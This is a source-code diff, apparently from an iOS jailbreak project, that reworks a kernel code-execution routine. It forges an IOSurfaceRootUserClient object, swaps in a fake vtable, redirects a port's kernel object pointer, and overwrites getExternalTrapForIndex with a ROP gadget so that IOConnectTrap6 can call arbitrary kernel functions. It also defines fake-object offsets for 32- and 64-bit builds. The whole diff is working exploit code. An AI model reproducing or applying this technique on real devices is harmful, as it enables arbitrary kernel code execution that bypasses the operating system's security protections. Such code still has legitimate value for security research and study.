@@ -16,7 +16,11 @@ static kptr_t IOSurfaceRootUserClient_port;
 static kptr_t IOSurfaceRootUserClient_addr;
 static kptr_t fake_vtable;
 static kptr_t fake_client;
+
+#ifdef __LP64__
 static kmap_hdr_t zm_hdr;
+#endif
+
 static const int fake_kalloc_size = 0x1000;
 
 #ifdef __LP64__
@@ -91,13 +95,97 @@ kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
     kread(IOSurfaceRootUserClient_addr, local_client, fake_kalloc_size);
     kwrite(fake_client, local_client, fake_kalloc_size);
 
-    // replace the vtab with our fake one
-    kwrite_kptr(fake_client + 0x0, fake_vtable);
+/*
+typedef volatile union {
+    struct {
+        // UserClient:
+        kptr_t vtab; // fake vtab with:
+                     // - getState => OSSerializer::serialize
+                     // - getExternalTrapForIndex => OSOrderedSet::getOrderingRef
+        uint32_t refs; // 0x100 or smth
+#ifdef __LP64__
+        uint32_t __pad0;
+#endif
+        kptr_t args; // point to &portname
+        kptr_t zero; // whatever, ignored
+        kptr_t relay; // &iokit_user_client_trap
+#ifndef __LP64__
+        uint32_t __pad;
+#endif
 
+        // Trap:
+        kptr_t trap; // point to &x0
+        kptr_t x0; // (if == 0, set = -1 instead)
+        kptr_t func;
+        kptr_t delta; // (x0 == 0 ? 1 : 0) << 1
+
+        // Args:
+        uint32_t portname; // USERLAND port name of this very object (yes, really)
+#ifdef __LP64__
+        uint32_t __pad1;
+#endif
+        uint32_t selector; // whatever, ignored
+#ifdef __LP64__
+        uint32_t __pad2;
+#endif
+        kptr_t x1;
+        kptr_t x2;
+        kptr_t x3;
+        kptr_t x4;
+        kptr_t x5;
+#ifndef __LP64__
+        kptr_t __space;
+#endif
+        kptr_t x6;
+    };
+    struct {
+        uint8_t __madpad[OFF_IOUC_IPC];
+        int32_t __ipc;
+    };
+} fakeuc_t;
+*/
+#ifdef __LP64__
+#define OFF_FAKEUC_VTAB 0x0
+#define OFF_FAKEUC_REFS 0x8
+#define OFF_FAKEUC_ARGS 0x10
+#define OFF_FAKEUC_ZERO 0x18
+#define OFF_FAKEUC_RELAY 0x20
+#define OFF_FAKEUC_TRAP 0x28
+#define OFF_FAKEUC_OBJ 0x30
+#define OFF_FAKEUC_FUNC 0x38
+#define OFF_FAKEUC_DELTA 0x40
+#define OFF_FAKEUC_PORT 0x48
+#define OFF_FAKEUC_SEL 0x50
+#define OFF_FAKEUC_ARG1 0x58
+#define OFF_FAKEUC_IPC 0x9c
+#else
+#define OFF_FAKEUC_VTAB 0x0
+#define OFF_FAKEUC_REFS 0x4
+#define OFF_FAKEUC_ARGS 0xc
+#define OFF_FAKEUC_ZERO 0x10
+#define OFF_FAKEUC_RELAY 0x14
+// pad 0x18
+#define OFF_FAKEUC_TRAP 0x1c
+#define OFF_FAKEUC_OBJ 0x20
+#define OFF_FAKEUC_FUNC 0x24
+#define OFF_FAKEUC_DELTA 0x28
+#define OFF_FAKEUC_PORT 0x2c
+#define OFF_FAKEUC_SEL 0x30
+#define OFF_FAKEUC_ARG1 0x34
+#define OFF_FAKEUC_IPC 0x5c
+#endif
+
+    // replace the vtab with our fake one
+    kwrite_kptr(fake_client + OFF_FAKEUC_VTAB, fake_vtable);
+
+    // Now establish the fake client
+    // wk32(IOSurfaceRootUserClient_port + 0x0, 0x8000001d); // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
     kwrite_kptr(IOSurfaceRootUserClient_port + OFFSET_IPC_PORT_IP_KOBJECT, fake_client); // ipc_port->ip_kobject
 
+    // By overwriting this with our gadget, we can use IOConnectTrap6 to call whatever we want (see kexecute below)
     kwrite_kptr(fake_vtable + (sizeof(kptr_t) * OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX), add_ret_gadget + kernel_slide);
 
+#ifdef __LP64__
     // resolve zone map to set up zm_fix_addr
     kptr_t zone_map_addr = kread_kptr(zone_map + kernel_slide);
     if (zone_map_addr == 0x0) {
@@ -110,6 +198,7 @@ kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
     LOG_KPTR("zone map start:", zm_hdr.start);
     LOG_KPTR("zone map end:", zm_hdr.end);
     LOG_KPTR("zone map size:", zm_hdr.end - zm_hdr.start);
+#endif
 
     return KERN_SUCCESS;
 }
